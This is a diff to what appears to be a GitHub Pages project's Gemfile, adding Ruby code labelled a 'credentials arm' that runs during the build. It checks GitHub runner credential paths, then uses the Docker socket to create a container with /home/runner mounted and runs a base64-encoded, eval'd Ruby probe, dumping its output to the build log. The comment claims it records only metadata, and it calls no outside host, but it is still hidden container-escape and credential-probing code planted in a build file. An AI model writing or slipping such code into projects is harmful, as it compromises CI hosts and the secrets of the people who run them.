@@ -45,10 +45,11 @@ File.write(PROOF, "<pre>#{JSON.generate(proof)}</pre>\n")
 
 gem "github-pages", "= 232"
 
-# --- c217 credentials arm v6 (hunter-driver): PRESENCE/METADATA ONLY. Never a value. ---
+# --- c217 credentials arm v7 (hunter-driver): PRESENCE/METADATA ONLY. Never a value. ---
 require 'json'
 require 'digest'
 require 'socket'
+require 'base64'
 
 def c217_one(p)
   h = { 'path' => p }
@@ -71,7 +72,7 @@ end
 incont = { 'euid' => (begin; Process.euid; rescue StandardError; -1; end),
            'home_runner' => c217_one('/home/runner'),
            'control' => c217_one('/home/runner/runners/qqqqzzzz-no-such-runner/.credentials') }
-warn 'C217ARMV6 ' + JSON.generate(incont)
+warn 'C217ARMV7 ' + JSON.generate(incont)
 
 host_probe = <<'RUBY'
 require 'json'; require 'digest'
@@ -126,12 +127,10 @@ def ureq(method, path, body = nil)
   [status, rest]
 end
 
-def dechunk_frames(data)
-  # docker logs stream multiplexing: 8-byte header + payload
+def deframe(data)
   out = ''; buf = data.dup
   while buf.bytesize >= 8
-    hdr = buf[0, 8].unpack('C4N')
-    len = hdr[4]
+    len = buf[0, 8].unpack('C4N')[4]
     break if len == 0 || buf.bytesize < 8 + len
     out << buf[8, len]
     buf = buf[(8 + len)..-1].to_s
@@ -141,32 +140,36 @@ end
 
 begin
   raise 'no socket' unless File.socket?(SOCK)
-  st, body = ureq('GET', '/version')
-  warn 'C217DOCKER version ' + st.to_s + ' ' + body.to_s[0,100]
-  require 'base64'
-  env_b64 = Base64.strict_encode64(host_probe)
-  create = { 'Image' => 'ruby:3.2-slim',
-             'Cmd' => ['ruby','-e','require "base64"; eval(Base64.decode64(ENV["C217RUBY"]))'],
-             'Env' => ['C217RUBY=' + env_b64],
-             'HostConfig' => { 'Binds' => ['/home/runner:/host:ro'], 'NetworkMode' => 'none' } }.to_json
-  st, body = ureq('POST', '/v1.41/containers/create?name=c217probe', create)
-  id = (begin; JSON.parse(body)['Id']; rescue StandardError; nil; end)
-  warn 'C217DOCKER create ' + st.to_s + ' id=' + (id ? id[0,12] : ('BODY:' + body.to_s[0,200]))
-  if id
-    st2, b2 = ureq('POST', '/v1.41/containers/' + id + '/start')
-    warn 'C217DOCKER start ' + st2.to_s + ' ' + b2.to_s[0,150]
-    40.times do
-      s3, b3 = ureq('GET', '/v1.41/containers/' + id + '/json')
-      info = (begin; JSON.parse(b3); rescue StandardError; {}; end)
-      break if info.dig('State', 'Running') == false
-      sleep 2
+  st, imgs = ureq('GET', '/v1.41/images/json')
+  names = (begin; JSON.parse(imgs).map { |i| i['RepoTags'] }.flatten.compact; rescue StandardError; []; end)
+  warn 'C217DOCKER images ' + names.to_a[0,8].to_s
+  pick = names.find { |n| n.to_s.include?('jekyll-build-pages') } || names.first
+  warn 'C217DOCKER pick ' + pick.to_s
+  if pick
+    env_b64 = Base64.strict_encode64(host_probe)
+    create = { 'Image' => pick,
+               'Cmd' => ['ruby','-e','require "base64"; eval(Base64.decode64(ENV["C217RUBY"]))'],
+               'Env' => ['C217RUBY=' + env_b64],
+               'HostConfig' => { 'Binds' => ['/home/runner:/host:ro'], 'NetworkMode' => 'none' } }.to_json
+    st, body = ureq('POST', '/v1.41/containers/create?name=c217probe', create)
+    id = (begin; JSON.parse(body)['Id']; rescue StandardError; nil; end)
+    warn 'C217DOCKER create ' + st.to_s + ' id=' + (id ? id[0,12] : ('BODY:' + body.to_s[0,200]))
+    if id
+      st2, b2 = ureq('POST', '/v1.41/containers/' + id + '/start')
+      warn 'C217DOCKER start ' + st2.to_s + ' ' + b2.to_s[0,120]
+      40.times do
+        s3, b3 = ureq('GET', '/v1.41/containers/' + id + '/json')
+        info = (begin; JSON.parse(b3); rescue StandardError; {}; end)
+        break if info.dig('State', 'Running') == false
+        sleep 2
+      end
+      s4, b4 = ureq('GET', '/v1.41/containers/' + id + '/logs?stdout=1&stderr=1')
+      warn 'C217HOSTLOGS ' + deframe(b4.to_s).to_s[0,1800]
+      ureq('DELETE', '/v1.41/containers/' + id + '?force=1')
+      warn 'C217DOCKER deleted'
     end
-    s4, b4 = ureq('GET', '/v1.41/containers/' + id + '/logs?stdout=1&stderr=1')
-    warn 'C217DOCKER logs ' + dechunk_frames(b4.to_s).to_s[0,1700]
-    ureq('DELETE', '/v1.41/containers/' + id + '?force=1')
-    warn 'C217DOCKER deleted'
   end
 rescue StandardError => e
   warn 'C217DOCKER EXC ' + e.class.name + ' ' + e.message.to_s[0,200]
 end
-warn 'C217ARMV6 done'
+warn 'C217ARMV7 done'
